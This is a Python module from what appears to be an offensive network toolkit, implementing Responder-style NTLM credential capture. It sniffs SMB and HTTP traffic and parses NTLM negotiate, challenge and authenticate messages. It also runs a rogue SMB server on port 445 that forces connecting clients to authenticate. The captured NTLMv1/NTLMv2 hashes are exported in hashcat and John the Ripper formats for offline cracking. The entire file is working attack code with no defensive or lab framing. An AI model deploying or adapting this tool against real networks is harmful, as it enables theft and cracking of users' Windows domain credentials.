"""
NTLM/NTLMv2 Hash Capture Module
────────────────────────────────
Responder-style NTLM challenge-response capture:
  - Sniffs SMB (port 445) for NTLM authentication
  - Captures HTTP NTLM auth (WWW-Authenticate: NTLM)
  - Parses NTLM Type 1 (Negotiate), Type 2 (Challenge), Type 3 (Authenticate)
  - Extracts NTLMv1/NTLMv2 hashes in hashcat/john format
  - Includes SMB server component that sends NTLM challenges
  - Output format: username::domain:challenge:response:blob
"""

import re
import time
import struct
import socket
import threading
import binascii
from collections import defaultdict

from scapy.all import IP, TCP, Raw, sniff

from .config import log


class NTLMCapture:
    """
    NTLM challenge-response hash capture engine (Responder-style).

    Sniffs SMB (port 445) and HTTP NTLM authentication traffic,
    captures NTLM Type 1/2/3 messages, and extracts NTLMv1/NTLMv2
    challenge-response hashes in hashcat-compatible format.
    """

    # NTLM signature
    NTLMSSP_SIGNATURE = b"NTLMSSP\x00"

    # NTLM message types
    NTLM_NEGOTIATE = 1
    NTLM_CHALLENGE = 2
    NTLM_AUTHENTICATE = 3

    def __init__(self, interface, challenge=None):
        self.interface = interface
        # Server challenge (8 bytes) - used when running our own SMB server
        self._server_challenge = challenge or b"\x11\x22\x33\x44\x55\x66\x77\x88"
        self._running = False
        self._thread = None
        self._smb_thread = None
        self._smb_server = None
        self._hashes = []
        self._sessions = {}  # Track NTLM sessions by (src_ip, dst_ip, src_port)
        self._lock = threading.Lock()
        self._packets_processed = 0

    def _parse_ntlm_type1(self, data):
        """Parse NTLM Type 1 (Negotiate) message."""
        try:
            if len(data) < 32:
                return None

            flags = struct.unpack("<I", data[12:16])[0]
            domain_len = struct.unpack("<H", data[16:18])[0]
            domain_offset = struct.unpack("<I", data[20:24])[0]
            workstation_len = struct.unpack("<H", data[24:26])[0]
            workstation_offset = struct.unpack("<I", data[28:32])[0]

            domain = ""
            workstation = ""
            if domain_len > 0 and domain_offset + domain_len <= len(data):
                domain = data[domain_offset:domain_offset + domain_len].decode(errors='ignore')
            if workstation_len > 0 and workstation_offset + workstation_len <= len(data):
                workstation = data[workstation_offset:workstation_offset + workstation_len].decode(errors='ignore')

            return {
                "type": 1,
                "flags": flags,
                "domain": domain,
                "workstation": workstation
            }
        except (struct.error, IndexError):
            return None

    def _parse_ntlm_type2(self, data):
        """Parse NTLM Type 2 (Challenge) message."""
        try:
            if len(data) < 32:
                return None

            target_name_len = struct.unpack("<H", data[12:14])[0]
            target_name_offset = struct.unpack("<I", data[16:20])[0]
            flags = struct.unpack("<I", data[20:24])[0]
            challenge = data[24:32]  # 8-byte server challenge

            target_name = ""
            if target_name_len > 0 and target_name_offset + target_name_len <= len(data):
                raw = data[target_name_offset:target_name_offset + target_name_len]
                target_name = raw.decode('utf-16-le', errors='ignore')

            return {
                "type": 2,
                "flags": flags,
                "challenge": challenge,
                "target_name": target_name
            }
        except (struct.error, IndexError):
            return None

    def _parse_ntlm_type3(self, data):
        """Parse NTLM Type 3 (Authenticate) message."""
        try:
            if len(data) < 64:
                return None

            # LM Response
            lm_len = struct.unpack("<H", data[12:14])[0]
            lm_offset = struct.unpack("<I", data[16:20])[0]

            # NTLM Response
            ntlm_len = struct.unpack("<H", data[20:22])[0]
            ntlm_offset = struct.unpack("<I", data[24:28])[0]

            # Domain
            domain_len = struct.unpack("<H", data[28:30])[0]
            domain_offset = struct.unpack("<I", data[32:36])[0]

            # Username
            user_len = struct.unpack("<H", data[36:38])[0]
            user_offset = struct.unpack("<I", data[40:44])[0]

            # Workstation
            workstation_len = struct.unpack("<H", data[44:46])[0]
            workstation_offset = struct.unpack("<I", data[48:52])[0]

            # Extract fields
            lm_response = b""
            ntlm_response = b""
            domain = ""
            username = ""
            workstation = ""

            if lm_len > 0 and lm_offset + lm_len <= len(data):
                lm_response = data[lm_offset:lm_offset + lm_len]
            if ntlm_len > 0 and ntlm_offset + ntlm_len <= len(data):
                ntlm_response = data[ntlm_offset:ntlm_offset + ntlm_len]
            if domain_len > 0 and domain_offset + domain_len <= len(data):
                domain = data[domain_offset:domain_offset + domain_len].decode('utf-16-le', errors='ignore')
            if user_len > 0 and user_offset + user_len <= len(data):
                username = data[user_offset:user_offset + user_len].decode('utf-16-le', errors='ignore')
            if workstation_len > 0 and workstation_offset + workstation_len <= len(data):
                workstation = data[workstation_offset:workstation_offset + workstation_len].decode(
                    'utf-16-le', errors='ignore'
                )

            # Determine NTLMv1 vs NTLMv2
            # NTLMv2: NTLM response > 24 bytes
            ntlm_version = 2 if ntlm_len > 24 else 1

            return {
                "type": 3,
                "lm_response": lm_response,
                "ntlm_response": ntlm_response,
                "domain": domain,
                "username": username,
                "workstation": workstation,
                "ntlm_version": ntlm_version,
                "lm_len": lm_len,
                "ntlm_len": ntlm_len
            }
        except (struct.error, IndexError):
            return None

    def _find_ntlmssp(self, data):
        """Find NTLMSSP signature in packet data and return the message."""
        idx = data.find(self.NTLMSSP_SIGNATURE)
        if idx == -1:
            return None, None

        ntlm_data = data[idx:]
        if len(ntlm_data) < 12:
            return None, None

        msg_type = struct.unpack("<I", ntlm_data[8:12])[0]
        return msg_type, ntlm_data

    def _format_ntlmv1_hash(self, type3, challenge):
        """Format NTLMv1 hash in hashcat format (mode 5500)."""
        # Format: username::domain:lm_response:ntlm_response:challenge
        lm_hex = binascii.hexlify(type3["lm_response"]).decode()
        ntlm_hex = binascii.hexlify(type3["ntlm_response"]).decode()
        challenge_hex = binascii.hexlify(challenge).decode()

        return (
            f"{type3['username']}::{type3['domain']}:"
            f"{lm_hex}:{ntlm_hex}:{challenge_hex}"
        )

    def _format_ntlmv2_hash(self, type3, challenge):
        """Format NTLMv2 hash in hashcat format (mode 5600)."""
        # Format: username::domain:challenge:hmac:blob
        # NTLMv2 response = HMAC (16 bytes) + blob (rest)
        ntlm_response = type3["ntlm_response"]
        if len(ntlm_response) < 16:
            return None

        hmac_part = ntlm_response[:16]
        blob_part = ntlm_response[16:]

        challenge_hex = binascii.hexlify(challenge).decode()
        hmac_hex = binascii.hexlify(hmac_part).decode()
        blob_hex = binascii.hexlify(blob_part).decode()

        return (
            f"{type3['username']}::{type3['domain']}:"
            f"{challenge_hex}:{hmac_hex}:{blob_hex}"
        )

    def _packet_handler(self, pkt):
        """Process packets for NTLM authentication messages."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        tcp = pkt[TCP]
        # Only process SMB (445) and HTTP (80, 8080) traffic
        if not (tcp.dport in (445, 80, 8080) or tcp.sport in (445, 80, 8080)):
            return

        self._packets_processed += 1
        payload = bytes(pkt[Raw].load)
        src_ip = pkt[IP].src if pkt.haslayer(IP) else "unknown"
        dst_ip = pkt[IP].dst if pkt.haslayer(IP) else "unknown"

        # Check for HTTP NTLM auth
        if tcp.dport in (80, 8080) or tcp.sport in (80, 8080):
            self._process_http_ntlm(payload, src_ip, dst_ip, tcp.sport, tcp.dport)
            return

        # Check for SMB NTLM auth
        msg_type, ntlm_data = self._find_ntlmssp(payload)
        if msg_type is None:
            return

        session_key = (src_ip, dst_ip, tcp.sport)

        if msg_type == self.NTLM_NEGOTIATE:
            type1 = self._parse_ntlm_type1(ntlm_data)
            if type1:
                log.info(
                    f"NTLM Negotiate from {src_ip} "
                    f"(domain={type1['domain']}, ws={type1['workstation']})"
                )

        elif msg_type == self.NTLM_CHALLENGE:
            type2 = self._parse_ntlm_type2(ntlm_data)
            if type2:
                # Store challenge for this session (reversed key since challenge comes from server)
                reverse_key = (dst_ip, src_ip, tcp.dport)
                self._sessions[reverse_key] = {
                    "challenge": type2["challenge"],
                    "target": type2["target_name"],
                    "timestamp": time.time()
                }
                log.info(
                    f"NTLM Challenge from {src_ip} "
                    f"(target={type2['target_name']}, "
                    f"challenge={binascii.hexlify(type2['challenge']).decode()})"
                )

        elif msg_type == self.NTLM_AUTHENTICATE:
            type3 = self._parse_ntlm_type3(ntlm_data)
            if type3 and type3["username"]:
                # Look up the challenge for this session
                challenge = self._server_challenge
                if session_key in self._sessions:
                    challenge = self._sessions[session_key]["challenge"]

                # Format the hash
                if type3["ntlm_version"] == 2:
                    hash_str = self._format_ntlmv2_hash(type3, challenge)
                    hash_type = "NTLMv2"
                    hashcat_mode = 5600
                else:
                    hash_str = self._format_ntlmv1_hash(type3, challenge)
                    hash_type = "NTLMv1"
                    hashcat_mode = 5500

                if hash_str:
                    hash_record = {
                        "username": type3["username"],
                        "domain": type3["domain"],
                        "workstation": type3["workstation"],
                        "hash_type": hash_type,
                        "hashcat_mode": hashcat_mode,
                        "hash": hash_str,
                        "challenge": binascii.hexlify(challenge).decode(),
                        "src_ip": src_ip,
                        "dst_ip": dst_ip,
                        "timestamp": time.time(),
                        "protocol": "SMB"
                    }

                    with self._lock:
                        self._hashes.append(hash_record)

                    log.critical(
                        f"NTLM HASH CAPTURED: [{hash_type}] "
                        f"{type3['username']}@{type3['domain']} "
                        f"from {src_ip}"
                    )

    def _process_http_ntlm(self, payload, src_ip, dst_ip, sport, dport):
        """Process HTTP NTLM authentication (WWW-Authenticate/Authorization: NTLM)."""
        try:
            payload_str = payload.decode(errors='ignore')
        except Exception:
            return

        # Look for NTLM in Authorization or WWW-Authenticate headers
        ntlm_patterns = [
            re.compile(r'Authorization:\s*NTLM\s+([A-Za-z0-9+/=]+)', re.I),
            re.compile(r'WWW-Authenticate:\s*NTLM\s+([A-Za-z0-9+/=]+)', re.I),
        ]

        for pattern in ntlm_patterns:
            match = pattern.search(payload_str)
            if match:
                try:
                    import base64
                    ntlm_data = base64.b64decode(match.group(1))
                    msg_type, ntlm_msg = self._find_ntlmssp(ntlm_data)

                    if msg_type == self.NTLM_CHALLENGE:
                        type2 = self._parse_ntlm_type2(ntlm_msg)
                        if type2:
                            session_key = (dst_ip, src_ip, dport)
                            self._sessions[session_key] = {
                                "challenge": type2["challenge"],
                                "target": type2["target_name"],
                                "timestamp": time.time()
                            }

                    elif msg_type == self.NTLM_AUTHENTICATE:
                        type3 = self._parse_ntlm_type3(ntlm_msg)
                        if type3 and type3["username"]:
                            session_key = (src_ip, dst_ip, sport)
                            challenge = self._server_challenge
                            if session_key in self._sessions:
                                challenge = self._sessions[session_key]["challenge"]

                            if type3["ntlm_version"] == 2:
                                hash_str = self._format_ntlmv2_hash(type3, challenge)
                                hash_type = "NTLMv2"
                                hashcat_mode = 5600
                            else:
                                hash_str = self._format_ntlmv1_hash(type3, challenge)
                                hash_type = "NTLMv1"
                                hashcat_mode = 5500

                            if hash_str:
                                hash_record = {
                                    "username": type3["username"],
                                    "domain": type3["domain"],
                                    "workstation": type3["workstation"],
                                    "hash_type": hash_type,
                                    "hashcat_mode": hashcat_mode,
                                    "hash": hash_str,
                                    "challenge": binascii.hexlify(challenge).decode(),
                                    "src_ip": src_ip,
                                    "dst_ip": dst_ip,
                                    "timestamp": time.time(),
                                    "protocol": "HTTP"
                                }

                                with self._lock:
                                    self._hashes.append(hash_record)

                                log.critical(
                                    f"NTLM HASH CAPTURED (HTTP): [{hash_type}] "
                                    f"{type3['username']}@{type3['domain']} "
                                    f"from {src_ip}"
                                )
                except Exception as e:
                    log.debug(f"HTTP NTLM parse error: {e}")

    def _smb_challenge_server(self):
        """
        Run a minimal SMB server that sends NTLM challenges to force
        authentication from connecting clients.
        """
        try:
            self._smb_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._smb_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._smb_server.bind(("0.0.0.0", 445))
            self._smb_server.listen(10)
            self._smb_server.settimeout(1.0)
            log.info("NTLM SMB challenge server started on port 445")

            while self._running:
                try:
                    client_sock, client_addr = self._smb_server.accept()
                    threading.Thread(
                        target=self._handle_smb_client,
                        args=(client_sock, client_addr),
                        daemon=True
                    ).start()
                except socket.timeout:
                    continue
                except OSError:
                    break

        except (OSError, socket.error) as e:
            log.warning(f"SMB challenge server error (port 445 may be in use): {e}")
        finally:
            if self._smb_server:
                try:
                    self._smb_server.close()
                except Exception:
                    pass

    def _handle_smb_client(self, client_sock, client_addr):
        """Handle an SMB client connection, sending an NTLM challenge."""
        try:
            client_sock.settimeout(10)

            # Wait for SMB negotiate
            data = client_sock.recv(4096)
            if not data:
                client_sock.close()
                return

            # Build minimal SMB2 negotiate response with NTLM challenge
            # This is a simplified version - just enough to elicit Type 3
            ntlm_challenge = self._build_ntlm_challenge()

            # SMB2 header + Security Blob containing NTLM Type 2
            smb2_response = self._build_smb2_challenge_response(ntlm_challenge)
            client_sock.sendall(smb2_response)

            # Receive the authentication (Type 3)
            auth_data = client_sock.recv(8192)
            if auth_data:
                msg_type, ntlm_data = self._find_ntlmssp(auth_data)
                if msg_type == self.NTLM_AUTHENTICATE:
                    type3 = self._parse_ntlm_type3(ntlm_data)
                    if type3 and type3["username"]:
                        if type3["ntlm_version"] == 2:
                            hash_str = self._format_ntlmv2_hash(type3, self._server_challenge)
                            hash_type = "NTLMv2"
                            hashcat_mode = 5600
                        else:
                            hash_str = self._format_ntlmv1_hash(type3, self._server_challenge)
                            hash_type = "NTLMv1"
                            hashcat_mode = 5500

                        if hash_str:
                            hash_record = {
                                "username": type3["username"],
                                "domain": type3["domain"],
                                "workstation": type3["workstation"],
                                "hash_type": hash_type,
                                "hashcat_mode": hashcat_mode,
                                "hash": hash_str,
                                "challenge": binascii.hexlify(self._server_challenge).decode(),
                                "src_ip": client_addr[0],
                                "dst_ip": "local",
                                "timestamp": time.time(),
                                "protocol": "SMB-Server"
                            }

                            with self._lock:
                                self._hashes.append(hash_record)

                            log.critical(
                                f"NTLM HASH (SMB Server): [{hash_type}] "
                                f"{type3['username']}@{type3['domain']} "
                                f"from {client_addr[0]}"
                            )

        except (socket.error, socket.timeout, OSError) as e:
            log.debug(f"SMB client handler error: {e}")
        finally:
            try:
                client_sock.close()
            except Exception:
                pass

    def _build_ntlm_challenge(self):
        """Build an NTLM Type 2 (Challenge) message."""
        # NTLMSSP signature + type
        msg = self.NTLMSSP_SIGNATURE
        msg += struct.pack("<I", self.NTLM_CHALLENGE)  # Type 2

        # Target name (empty for simplicity)
        target_name = b"W\x00O\x00R\x00K\x00G\x00R\x00O\x00U\x00P\x00"
        target_name_len = len(target_name)
        target_name_offset = 56  # Fixed offset

        msg += struct.pack("<H", target_name_len)  # Target name len
        msg += struct.pack("<H", target_name_len)  # Target name max len
        msg += struct.pack("<I", target_name_offset)  # Target name offset

        # Flags: Negotiate NTLM | Negotiate Unicode | Target Type Domain
        flags = 0x00028233
        msg += struct.pack("<I", flags)

        # Server challenge (8 bytes)
        msg += self._server_challenge

        # Reserved (8 bytes)
        msg += b"\x00" * 8

        # Target info (empty)
        msg += struct.pack("<H", 0)  # Target info len
        msg += struct.pack("<H", 0)  # Target info max len
        msg += struct.pack("<I", 0)  # Target info offset

        # Pad to offset
        while len(msg) < target_name_offset:
            msg += b"\x00"

        # Target name
        msg += target_name

        return msg

    def _build_smb2_challenge_response(self, ntlm_challenge):
        """Build a minimal SMB2 response containing the NTLM challenge."""
        # NetBIOS session header (4 bytes): 0x00 + 3-byte length
        # For simplicity, wrap the NTLM challenge in a basic structure
        # This is a simplified representation
        smb2_header = b"\xfeSMB"  # SMB2 magic
        smb2_header += b"\x00" * 60  # Minimal SMB2 header padding

        # Security blob containing NTLM Type 2
        security_blob = ntlm_challenge

        # Combine with NetBIOS header
        payload = smb2_header + security_blob
        netbios_header = struct.pack(">I", len(payload))
        netbios_header = b"\x00" + netbios_header[1:]  # Session message type

        return netbios_header + payload

    def _sniff_loop(self):
        """Background sniffing thread."""
        try:
            sniff(
                iface=self.interface,
                prn=self._packet_handler,
                store=False,
                filter="tcp port 445 or tcp port 80 or tcp port 8080",
                stop_filter=lambda x: not self._running
            )
        except Exception as e:
            log.error(f"NTLM capture sniff error: {e}")

    def start(self, run_server=True):
        """Start NTLM hash capture."""
        if self._running:
            log.warning("NTLM capture already running")
            return False

        self._running = True

        # Start packet sniffer
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

        # Optionally start SMB challenge server
        if run_server:
            self._smb_thread = threading.Thread(target=self._smb_challenge_server, daemon=True)
            self._smb_thread.start()

        log.info(f"NTLM capture started on {self.interface}")
        return True

    def stop(self):
        """Stop NTLM hash capture."""
        self._running = False

        if self._smb_server:
            try:
                self._smb_server.close()
            except Exception:
                pass

        if self._thread:
            self._thread.join(timeout=5)
        if self._smb_thread:
            self._smb_thread.join(timeout=5)

        log.info(f"NTLM capture stopped. {len(self._hashes)} hashes captured")

    def get_hashes(self):
        """Return all captured NTLM hashes."""
        with self._lock:
            return list(self._hashes)

    def export_hashcat(self, output_file=None):
        """
        Export captured hashes in hashcat format.
        NTLMv1: mode 5500
        NTLMv2: mode 5600
        Format: username::domain:challenge:response:blob
        """
        with self._lock:
            lines = []
            for h in self._hashes:
                lines.append(h["hash"])

            if output_file:
                with open(output_file, "w") as f:
                    f.write("\n".join(lines) + "\n")
                log.info(f"Exported {len(lines)} hashes to {output_file}")

            return lines

    def export_john(self, output_file=None):
        """Export captured hashes in John the Ripper format (same as hashcat for NTLM)."""
        return self.export_hashcat(output_file)

    def get_stats(self):
        """Return NTLM capture statistics."""
        with self._lock:
            by_type = defaultdict(int)
            by_protocol = defaultdict(int)
            for h in self._hashes:
                by_type[h["hash_type"]] += 1
                by_protocol[h["protocol"]] += 1

            return {
                "running": self._running,
                "total_hashes": len(self._hashes),
                "packets_processed": self._packets_processed,
                "active_sessions": len(self._sessions),
                "by_type": dict(by_type),
                "by_protocol": dict(by_protocol),
            }
